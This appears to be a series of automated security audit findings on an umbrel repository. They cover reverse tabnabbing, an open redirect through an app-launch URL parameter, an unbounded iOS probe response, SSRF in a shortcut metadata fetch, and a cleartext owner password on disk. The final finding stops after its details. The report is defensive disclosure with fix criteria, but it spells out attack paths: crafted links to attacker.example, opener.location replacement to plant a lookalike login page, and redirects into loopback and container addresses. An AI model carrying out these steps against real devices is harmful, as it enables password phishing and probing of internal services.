Root cause: an external, untrusted navigation target is opened while retaining an opener handle to the authenticated dashboard document.

## Evidence
1. [packages/ui/src/components/cmdk-sources.tsx:573](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/components/cmdk-sources.tsx#L573)
   Sink: the Cmd+K shortcut entry's onSelect calls `window.open(resolveShortcutUrl(shortcut), '_blank')?.focus()`. No `noopener` feature is passed (the code keeps the returned handle to call `.focus()`), so the opened cross-origin document receives a live `window.opener` referencing the authenticated dashboard tab, and the HTML spec permits a cross-origin document to assign `opener.location` / call `opener.location.replace()`.
2. [packages/ui/src/modules/desktop/shortcut-icon.tsx:25–27](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/desktop/shortcut-icon.tsx#L25-L27)
   Sibling sink: the desktop shortcut icon click and its context-menu 'Open' item use the identical `window.open(resolveShortcutUrl(shortcut), '_blank')?.focus()` call.
3. [packages/ui/src/modules/desktop/shortcut-dialog.tsx:28–34](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/desktop/shortcut-dialog.tsx#L28-L34)
   `resolveShortcutUrl` returns the stored shortcut URL verbatim for http:/https: shortcuts; the dialog explicitly offers plain `http://` as a protocol choice, so shortcut targets are arbitrary third-party (often LAN, plain-HTTP) origins.
4. [packages/umbreld/source/modules/shortcuts/routes.ts:24–48](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/routes.ts#L24-L48)
   The server accepts any URL that parses (`z.string().url()`), including `http://` hosts, and stores it; nothing restricts the target origin.
5. [packages/umbreld/source/modules/server/index.ts:121–137](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L121-L137)
   The only security headers set are a CSP (no frame-ancestors) and Referrer-Policy; no Cross-Origin-Opener-Policy is sent, so nothing severs the opener relationship at the policy level.
6. [packages/ui/src/routes/settings/cmdk-entries.ts:50–51](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/routes/settings/cmdk-entries.ts#L50-L51)
   Contrast: other external links in the same UI are opened with `window.open(target.to, '_blank', 'noopener,noreferrer')`, showing the shortcut sinks are the outliers rather than a deliberate policy.

## Impact
The attacker can force the authenticated dashboard tab to navigate to an arbitrary URL (a login-page lookalike), but cannot read dashboard state or tokens directly and does not affect availability of the device. Any credential theft depends on a further phishing step by the user.

## Reproduction steps
1. Attacker position: the operator of a web page the owner has saved as a desktop shortcut, anyone who has compromised that page, or an unauthenticated LAN peer performing machine-in-the-middle on a plain-`http://` shortcut target (a protocol the add dialog explicitly offers). No umbrelOS credentials are needed. When the owner clicks the shortcut in Cmd+K or on the desktop, `window.open(url, '_blank')` opens it with `window.opener` set to the dashboard document; the page's script runs `opener.location.replace(attackerUrl)` and the dashboard tab is replaced by a lookalike login page while the user is looking at the new tab. Works in current browsers: the implicit-noopener default applies only to anchor `target=_blank`, not to `window.open`, and umbreld sends no Cross-Origin-Opener-Policy (server/index.ts sets only CSP and Referrer-Policy; lan-ingress only strips HSTS). Attack requirement: the owner must have saved a shortcut to a page the attacker controls or can intercept, which is the feature's intended use rather than a misconfiguration. Contrast: the project concedes opener handles only to installed apps (use-launch-app.ts:56) and opens every other external link with 'noopener,noreferrer'; the two shortcut sinks are the outliers.

## Recommended fix
1. Both shortcut-opening call sites use `window.open(url, '_blank')` without the `noopener` feature so the external page keeps an `opener` handle to the dashboard document. Fix criteria: Shortcut targets must be opened without an opener relationship: a page opened from a shortcut must observe `window.opener === null`, and assigning `opener.location` from it must have no effect on the dashboard tab. The focus-after-open behaviour, if kept, must not depend on retaining the opener handle (e.g. an anchor with `rel='noopener noreferrer'`, or accepting that `window.open` returns null).
2. umbreld serves the dashboard without a Cross-Origin-Opener-Policy, so the browser never severs opener links from documents the dashboard opens. Fix criteria: Dashboard HTML responses carry a COOP of `same-origin` (or `same-origin-allow-popups` where popups to app ports must keep a handle), so that cross-origin pages opened from the dashboard cannot navigate it even if a call site omits `noopener`; verify by opening a cross-origin shortcut and confirming `opener` is null.

---
**Severity:** LOW
**Status:** Open
**Category:** Reverse tabnabbing
**CWE:** [CWE-1022](https://cwe.mitre.org/data/definitions/1022.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258128

---

# Dashboard app-launch URL parameter is an open redirect through window.open with opener access (phishing / reverse tabnabbing)

## Details
The dashboard's app-launch dialog (`packages/ui/src/modules/app-store/app-page/app-launch-dialog.tsx`) is URL-driven: `useDialogOpenProps('app-launch')` opens it whenever `?dialog=app-launch` is in the page URL, `app-launch-for` names the app, and `path` is read verbatim from `app-launch-path` (line 24). Clicking the dialog's single button calls `launchApp(appId, {direct: true, protocol, path})` (line 46). In `useLaunchApp.open()` (`use-launch-app.ts:53-57`) the target is `urlJoin(appToUrl(app, protocol), path)` and is passed to `window.open(url, '_blank')?.focus()`. `urlJoin` is `new URL(path, base).href` (`utils/misc.ts:32-34`): per the WHATWG URL parser an absolute or protocol-relative `path` discards `base`, so `https://attacker.example/` or `//attacker.example/` replaces the app's `https://<host>:<port>` origin entirely. Nothing checks the resulting scheme or origin, and `window.open` is called without the `noopener` feature; umbreld sets no Cross-Origin-Opener-Policy (helmet is used only for CSP and Referrer-Policy in `server/index.ts`), so the opened page keeps `window.opener`.

Attack: an unauthenticated network peer, or any web page the victim visits, gets the owner or a member to open `https://umbrel.local/?dialog=app-launch&app-launch-for=<installed app>&app-launch-credentials=true&app-launch-path=https://attacker.example/x`. `<AppLaunchDialog />` is mounted on the root desktop route (`layouts/desktop.tsx:52`), so any dashboard path renders it; `useUserApp` only requires that `app-launch-for` be an installed (or, for members, shared) app id, which is low-entropy and confirmable through the unauthenticated `GET :2000/v1/apps?app=<id>` endpoint (`server/app-auth.ts:210-216`, which throws for apps not installed). If the victim is logged out, `RedirectLogin` snapshots pathname+search into `?redirect=` and `getRedirectUrl` restores it after login, so the dialog still appears. The victim sees the genuine umbrelOS 'Open <app>' dialog (optionally with the app's default credentials) with one button and no destination shown; clicking it opens the attacker's page in a new tab. Because that page holds `window.opener`, it can run `opener.location = 'https://attacker.example/umbrel-login'` and replace the still-open dashboard tab with a lookalike lock screen (reverse tabnabbing) to harvest the owner's password.

The project already treats off-origin navigation from a URL parameter as a defended surface: `modules/auth/redirect-url.ts` rejects absolute, protocol-relative and slash-backslash `?redirect=` targets, with tests in `redirects.test.ts`; the app-launch path has no equivalent check.

Scheme note: `urlJoin` would equally yield a `javascript:` URL, and `window.open('javascript:...')` would run in an about:blank popup inheriting the dashboard origin (exposing `localStorage['umbrel-auth-token']`). In production umbreld's helmet CSP (`default-src 'self'`, `scriptSrc: null`, no `'unsafe-inline'`) is inherited by that popup and blocks the javascript: navigation in CSP-enforcing browsers (assumption about browser behaviour, not verified here), so that escalation is limited to `developmentMode`. The open-redirect/tabnabbing path is not affected by CSP.

Root cause: `useLaunchApp`/`urlJoin` treat `path` as a path fragment but never enforce that the result stays on the app's http(s) origin; the dialog accepts the value from the URL without constraint; and the opened window is given opener access.

## Evidence
1. [packages/ui/src/hooks/use-launch-app.ts:53–56](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/hooks/use-launch-app.ts#L53-L56)
   Sink. `open(path)` computes `urlJoin(appToUrl(app, protocol), path)` and passes the result to `window.open(url, '_blank')?.focus()` with no `noopener` feature and no scheme/origin check on `path`; an absolute `path` fully replaces the app base URL and the opened page keeps `window.opener` on the dashboard tab.
2. [packages/ui/src/modules/app-store/app-page/app-launch-dialog.tsx:21–47](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/app-store/app-page/app-launch-dialog.tsx#L21-L47)
   Source. `path` is read verbatim from the `app-launch-path` query parameter (line 24) and forwarded as `launchApp(appId, {direct: true, protocol, path})` (line 46) when the user clicks the dialog's only button. The dialog never displays the destination; with `app-launch-credentials=true` it also shows the app's default username/password.
3. [packages/ui/src/utils/misc.ts:32–34](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/utils/misc.ts#L32-L34)
   `urlJoin(base, path)` is `new URL(path, base).href`. Per the WHATWG URL parser an absolute or protocol-relative `path` ignores `base`, so `new URL('https://evil.example/', 'https://umbrel.local:8080').href === 'https://evil.example/'`.
4. [packages/ui/src/utils/dialog.ts:100–117](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/utils/dialog.ts#L100-L117)
   `useDialogOpenProps(dialogKey)` sets the dialog open whenever `searchParams.get('dialog') === dialogKey`, so `?dialog=app-launch` in a crafted link opens the launch dialog with no prior user action inside the dashboard.
5. [packages/ui/src/layouts/desktop.tsx:47–58](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/layouts/desktop.tsx#L47-L58)
   `<AppLaunchDialog />` is mounted unconditionally on the root desktop layout (rendered for every logged-in dashboard route), so any dashboard page load with the crafted query string renders the dialog.
6. [packages/ui/src/modules/auth/redirects.tsx:113–124](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/auth/redirects.tsx#L113-L124)
   `createRedirectSearch` snapshots `pathname + search` into `?redirect=` when a logged-out victim hits the dashboard, and `getRedirectUrl` restores it after login, so the crafted `dialog=app-launch...` query survives the login round-trip; the victim need not already be logged in.
7. [packages/ui/src/modules/auth/redirect-url.ts:1–13](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/auth/redirect-url.ts#L1-L13)
   Contrast showing the project defends this surface elsewhere: `resolveRedirectUrl` rejects any `?redirect=` target that is not a same-origin path beginning with '/', with tests for absolute, protocol-relative and slash-backslash URLs (`redirects.test.ts`). The app-launch path has no equivalent check.
8. [packages/umbreld/source/modules/server/index.ts:120–137](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L120-L137)
   Bounds the impact and fixes the category: helmet is used only for CSP (`scriptSrc: null` in production, so `default-src 'self'` with no `'unsafe-inline'`) and Referrer-Policy; no Cross-Origin-Opener-Policy is set, so the cross-origin popup keeps `window.opener`. The CSP blocks the `javascript:` variant of this flaw in production (dev mode adds `'unsafe-inline'`), but does not restrict `window.open` to external http(s) destinations.
9. [packages/umbreld/source/modules/server/app-auth.ts:210–216](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/app-auth.ts#L210-L216)
   Unauthenticated `GET /v1/apps?app=<id>` on the app-auth port returns the manifest id/name for an installed app and errors otherwise (`apps.getApp` throws when the app is not installed), letting the attacker confirm a valid `app-launch-for` value without credentials.

## Impact
Direct impact is phishing: the victim is sent from a genuine umbrelOS dialog to an attacker-chosen page, and the dashboard tab itself can be replaced with a lookalike login via window.opener, which plausibly yields the owner password (and the app's displayed default credentials). No direct data read or modification without further deception, so confidentiality and integrity are rated low; no availability impact.

## Reproduction steps
1. Attacker on the network (or any website) crafts a dashboard URL with `?dialog=app-launch&app-launch-for=<installed app>&app-launch-path=https://attacker/...` and gets a logged-in owner/member to open it and click the dialog's only button. No credentials are needed; the installed app id is guessable and verifiable via the public `/v1/apps?app=` endpoint on port 2000. The victim lands on the attacker page and the attacker page can navigate the dashboard tab via window.opener. Works in every default deployment; the javascript: variant is blocked by production CSP and only applies in development mode.

## Recommended fix
1. `useLaunchApp.open()` passes `urlJoin(appToUrl(app), path)` to `window.open` without constraining the result; `urlJoin` lets an absolute `path` (any scheme, any host) replace the app base URL. Fix criteria: After joining, the launch URL must have an http: or https: scheme and an origin equal to the computed app origin (or the app's onion origin); anything else is rejected and nothing is opened. Verify that `app-launch-path=https://evil.example/`, `//evil.example/`, and `javascript:alert(1)` no longer open anything, while a relative path such as `/admin?x=1` still opens `https://<host>:<port>/admin?x=1`.
2. `window.open(url, '_blank')` is called without `noopener`, so the opened page can navigate the dashboard tab (reverse tabnabbing). Fix criteria: The app window is opened with `noopener` (focus handled without the returned handle, or via a `rel=noopener` anchor); verify `window.opener` is null in the opened page.
3. The app-launch dialog accepts `app-launch-path` from the page URL, so an unauthenticated attacker can supply the launch target by link. Fix criteria: Values taken from the URL for the app-launch dialog are restricted to same-origin relative paths (start with a single '/' and resolve to the app origin) before being passed to `launchApp`; a crafted link cannot cause navigation off the app's own origin.

---
**Severity:** LOW
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258125

---

# isBrowserEndpoint buffers unbounded plaintext response from untrusted LAN host

## Details
`Umbreld.isBrowserEndpoint` (clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:1360-1379) probes `http://<host>/trpc/system.discoveryInfo` on each candidate browser host with `browserProbeSession.data(for:)` (line 1374). `URLSession.data(for:)` accumulates the entire response body in memory before returning, and nothing in this path bounds it: `decodeDiscoveryInfo` runs only after the body is complete, `UmbreldNoRedirectDelegate` (line 1987) implements only the redirect callback, and `browserProbeSession` (lines 125-137) sets only `timeoutIntervalForRequest = 10` while the per-request `timeoutInterval` (3 s, or 1 s for DNS names) is likewise an idle timeout; `timeoutIntervalForResource` is left at Foundation's default (7 days). A peer that keeps streaming bytes therefore never trips a timeout and the body grows until the process is killed.

Every other untrusted-host fetch in UmbrelKit (`bootstrapData`, `fallbackDiscoveryData`, the candidate-certificate path) goes through `LocalHTTPSTransport.boundedData` (LocalHTTPS.swift:78-104), which streams with a 64 KB cap and a hard `timeoutIntervalForResource`; the maintainers' comment at LocalHTTPS.swift:48-51 names exactly this hazard ("streaming enforces the body limit before Foundation buffers an arbitrary response in memory"). `isBrowserEndpoint` is the one probe that bypasses that protection.

The shipped caller is the iOS app's `MainModel.firstReachableBrowserEndpoint` (clients/apple/ios/Sources/Main/MainModel.swift:1273-1297), invoked from `dashboardURLForOpening`/app opening on every dashboard or app open (subject to a 2-minute reachability cache). Candidates come from `browserAddressOptions` (MainModel.swift:436-441): the saved device's `host` (its Bonjour `.local` name) and `addresses` (its LAN IPv4s). Any LAN peer can answer for a `.local` name via mDNS or for an IP via ARP spoofing or by occupying a stale DHCP lease; serving a multi-gigabyte or endless body on `/trpc/system.discoveryInfo` makes the victim's iOS app allocate until jetsam terminates it. This is a single-response unbounded allocation whose size the attacker sets, not volumetric load. Only the iOS client calls `isBrowserEndpoint`; the macOS app does not.

Assumed dependency behaviour (Apple Foundation URLSession, iOS 26.5 deployment target per clients/apple/ios/project.yml): `data(for:)` buffers the whole body with no default size cap; `timeoutIntervalForRequest`/`URLRequest.timeoutInterval` are idle-interval timeouts; `timeoutIntervalForResource` defaults to 604800 s. These are documented public API contracts, and the project's own `boundedData` and its tests (UmbrelKit/Tests/UmbrelKitTests/LocalHTTPSTests.swift) rely on the same behaviour.

## Evidence
1. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:1360–1379](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L1360-L1379)
   isBrowserEndpoint calls browserProbeSession.data(for:) at line 1374 on a plaintext request to an untrusted candidate host; the whole body is buffered before decodeDiscoveryInfo runs, and the request's timeoutInterval is an idle timeout. This is the code the fix must change.
2. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:125–137](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L125-L137)
   browserProbeSession sets only timeoutIntervalForRequest (idle); timeoutIntervalForResource keeps Foundation's 7-day default and there is no body limit. Its delegate (UmbreldNoRedirectDelegate, line 1987) only refuses redirects.
3. [clients/apple/ios/Sources/Main/MainModel.swift:1273–1297](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Main/MainModel.swift#L1273-L1297)
   Shipped iOS caller: firstReachableBrowserEndpoint probes each candidate with isBrowserEndpoint on every dashboard/app browser open (outside a 2-minute cache), with 3 s / 1 s idle timeouts.
4. [clients/apple/ios/Sources/Main/MainModel.swift:436–441](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Main/MainModel.swift#L436-L441)
   browserAddressOptions supplies the probed hosts: the saved device's Bonjour host name and its LAN IPv4 addresses, both of which a LAN peer can answer for (mDNS/ARP spoofing, stale lease).
5. [clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift:48–104](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift#L48-L104)
   The bounded streaming helper (boundedData, 64 KB cap plus hard resource deadline) that every other untrusted-host probe uses; the comment at lines 48-51 states the exact hazard isBrowserEndpoint leaves unaddressed.

## Impact
The iOS client app buffers the response until jetsam terminates it; no data is disclosed or altered. The crash repeats on each browser open while the attacker remains on the LAN, and the umbrelOS device itself is unaffected.

## Reproduction steps
1. Adjacent-network attacker: a LAN peer must answer for the saved device's .local name (mDNS response) or LAN IP (ARP spoof or stale DHCP lease) — a positional precondition, hence attack_requirements PRESENT — and then serve an endless or multi-gigabyte HTTP body on /trpc/system.discoveryInfo. No credentials are involved; the victim only performs the routine action of opening the dashboard or an app from the iOS client. There is no size or resource-time control on this path to bypass.

## Recommended fix
isBrowserEndpoint reads an untrusted plaintext probe response with URLSession.data(for:), which buffers the whole body, on a session with no body-size cap and no resource (total) timeout. Fix criteria: The browser probe must stream the response and abort once the body exceeds a small fixed cap (as LocalHTTPSTransport.boundedData does for the other probes) and must carry a hard timeoutIntervalForResource; a response exceeding the cap or outliving the deadline fails the probe without unbounded memory growth.

---
**Severity:** LOW
**Status:** Open
**Category:** Uncontrolled Resource Consumption
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258122

---

# Shortcut page-metadata fetch is an unrestricted server-side request following redirects to any host

## Details
`shortcuts.fetchPageMetadata` (shortcuts/routes.ts:12-15, owner-only) hands a user-typed URL to `fetchPageMetadata` (fetch-page-metadata.ts), which validates it only with `new URL()` and then issues up to four GET requests from umbreld (running as root on the host network, with loopback, Docker app-network 10.21.0.0/16 and LAN reachability): the page itself, an optional web-app manifest whose absolute URL is taken from the fetched HTML, and `/apple-touch-icon.png` and `/favicon.ico` on the final base. All requests go through `doFetch` (lines 169-192), which sets no `redirect` option, so node-fetch (^3.3.2) follows Location headers to any http(s) host, and the code deliberately uses the post-redirect `response.url` as the base for the subsequent probes (lines 35, 141, 157, 166). There is no policy on destination scheme, hostname or address class on any hop, and TLS verification is disabled for every https fetch (`rejectUnauthorized: false`, line 8).

Consequence: a page author whose URL the owner enters into the Add-Shortcut dialog (the dialog queries this procedure automatically 600 ms after typing, shortcut-dialog.tsx:164-195) — or an on-path LAN attacker impersonating any https shortcut target, which the disabled certificate validation permits — can 302 umbreld to `http://127.0.0.1:<port>/...`, `http://10.21.x.x/...` (app containers' internal services that are only reachable through the app-gateway's login from the LAN), or any LAN device, and have the root daemon GET that URL plus `/apple-touch-icon.png` and `/favicon.ico` there; a `<link rel=manifest href="http://10.21.0.5:5984/...">` in the attacker's page triggers a further attacker-chosen GET. The same effect is reached with a hostname whose A record points at an internal address. This reaches address space the threat model treats as not publicly exposed (loopback umbreld, in-container services) and bypasses the app-gateway, which is the shipped control for app ports.

What the attacker learns is limited: only the final page's `<title>` (max 100 chars) and a resolved icon URL are returned, and only to the owner's UI, so this is a blind SSRF whose impact is side effects of fixed-header GET requests on internal/LAN services. The `umbrel:<port>` -> `http://localhost:<port>` mapping (routes.ts:6-8) is a sanctioned path for the owner's own ports and is not itself the problem; the problem is that external URLs and their redirects are not prevented from landing in the same address space.

## Evidence
1. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:169–191](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L169-L191)
   doFetch is the single GET primitive for every request in this module. It passes no `redirect` option, so node-fetch (^3.3.2) follows Location headers (default follow, up to 20 hops) to any http(s) host the remote names, and for https it attaches the certificate-ignoring agent (line 180). There is no check of the resolved destination (loopback, link-local, RFC1918, the 10.21.0.0/16 app network) on the initial URL or on any redirect hop. This is where a per-hop destination policy and certificate validation must be added.
2. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:29–49](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L29-L49)
   fetchPageMetadata validates the owner-supplied URL only with `new URL(url)` (line 30), fetches it, and then deliberately uses the post-redirect `response.url` as `base` (line 35) for every follow-up probe, so the host the remote redirected to becomes the target of the manifest, apple-touch-icon and favicon GETs.
3. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:8](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L8)
   A module-wide https.Agent with rejectUnauthorized:false disables TLS certificate validation for every https fetch, so an on-path attacker (e.g. a LAN peer) can impersonate any https shortcut target and supply the redirect/HTML that steers umbreld into internal address space.
4. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:87–92](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L87-L92)
   findManifestHref takes a manifest URL from the fetched (attacker-authored) HTML, constrained only to http/https, and fetchManifestIcon (lines 122-127) GETs it: a second attacker-chosen absolute URL that umbreld requests, e.g. http://10.21.0.5:5984/... on the Docker app network.
5. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:151–166](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L151-L166)
   probeAppleTouchIcon and fetchFavicon GET /apple-touch-icon.png and /favicon.ico on the final post-redirect base, i.e. on whatever internal host the remote redirected umbreld to, and return that host's response.url.
6. [packages/umbreld/source/modules/shortcuts/routes.ts:6–14](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/routes.ts#L6-L14)
   Owner-only tRPC entry point (privateProcedure = ownerProcedure). toFetchableUrl maps umbrel:<port> to http://localhost:<port> (sanctioned for the owner's own ports); any other string with min length 1 is handed to fetchPageMetadata unchanged. The Add-Shortcut dialog (packages/ui/src/modules/desktop/shortcut-dialog.tsx:164-195) calls this query automatically 600 ms after the owner types or pastes a URL.

## Impact
The response reveals only a 100-char title and an icon URL, and only to the owner's own browser, so the attacker gains no data from umbreld itself. Integrity impact on umbreld is limited to whatever an unauthenticated loopback GET to 22080 can do, which this audit found to be nothing (all loopback routes require a token). Rated as no direct impact on umbreld; the impact is on reachable internal services (subsequent system). Subsequent-system impact: umbreld can be made to issue arbitrary GET requests (chosen path, no custom headers) to app containers' unpublished internal services on the Docker network and to any LAN host. Services that act on unauthenticated GETs (common in IoT devices and some app admin endpoints) can be driven; responses are not returned to the attacker, so confidentiality impact is none and integrity impact is limited.

## Reproduction steps
1. Attacker hosts a web page (or, because certificate validation is disabled, sits on-path for any https shortcut target). The owner opens Add Shortcut and types/pastes the URL; the dialog automatically calls fetchPageMetadata after 600 ms. The attacker's server answers with a 302 to an internal address, or serves HTML with a manifest href pointing there; umbreld issues GETs to the internal target and to its /favicon.ico and /apple-touch-icon.png. Only the owner can invoke the procedure, so the attacker needs no umbreld privileges but does need the owner to enter the URL (UI:Active). Dependency assumption: node-fetch ^3.3.2 with no `redirect` option follows redirects (default 'follow', 20 hops) to any http(s) URL, stripping only credential headers on cross-origin hops; it applies no private-address policy. No network sandboxing on umbrel.service (no User=, PrivateNetwork or IPAddressDeny), so the daemon reaches loopback, the Docker app network and the LAN.

## Recommended fix
1. The destination of the server-side fetch (initial URL, every redirect hop, manifest href, and icon probes) is unconstrained, so a public page can redirect the root daemon into loopback, Docker and LAN address space. Fix criteria: Every URL fetched by fetchPageMetadata, including each redirect target and the manifest/icon URLs derived from fetched content, must be checked after DNS resolution against a policy that forbids loopback, link-local, RFC1918/ULA and the Docker network unless the request originated as an explicit umbrel:<port> shortcut (in which case only http://localhost:<port> is allowed). A page that 302s to http://127.0.0.1:22080/ or http://10.21.0.5/ must result in no request being sent to that address.
2. TLS certificate validation is disabled for all https fetches, letting an on-path attacker supply the metadata. Fix criteria: Certificate validation must be enabled by default; if self-signed local targets must be supported, the exception must be limited to the device's own hostname/LAN address rather than applied globally.

---
**Severity:** LOW
**Status:** Open
**Category:** Server-side request forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258121

---

# Owner password written in cleartext to boot partition and left permanently on boot-disk data partition

## Details
During onboarding on a multi-drive device, user.register forwards the owner's chosen name and password to Raid.triggerInitialRaidSetupBootFlow (raid.ts:1120). After creating the pool it persists the plaintext password with configStore.set('user', {name, password, language}) (1134) into the unencrypted FAT config partition /run/rugix/mounts/config/umbrel.yaml so the next boot can create the account.

Every config write also triggers the FileStore onAfterWrite hook (482-487), which copies umbrel.yaml to ${dataDirectory}/umbrel-boot-config.yaml 'so recovery after a boot disk reflash can restore it'. At this moment the pool is not yet the data mount: ${dataDirectory} (/home/umbrel/umbrel) resolves to state/default/persist/data/umbrel-os/home/umbrel/umbrel on the boot disk's default ext4 data partition (umbrel-data-mount:173-188). The cleartext password is therefore written to a second unencrypted location on the boot disk.

On the following boot umbrel-data-mount mounts only <pool>/data (147-149); the ext4 partition is left unmounted. handlePostBootRaidSetupProcess (1151-1168) registers the user and then deletes user.password from the config partition only. The ext4 copy is never rewritten or removed - nothing in the tree references it except the factory-reset hook's mkfs.ext4 (prepare.sh:63). The owner's plaintext password thus remains on the boot disk for the life of the install.

The cleanup of the config partition is also fragile: the delete runs only when register succeeded in the same boot and no user existed. If umbreld crashes or power is lost between user.register and configStore.delete('user.password'), the next boot sees an existing user, skips the branch, and the plaintext stays in the config partition and in the pool's umbrel-boot-config.yaml copy indefinitely (the pool copy is refreshed on every write before the delete). If register keeps failing (initialRaidSetupError), the plaintext likewise persists.

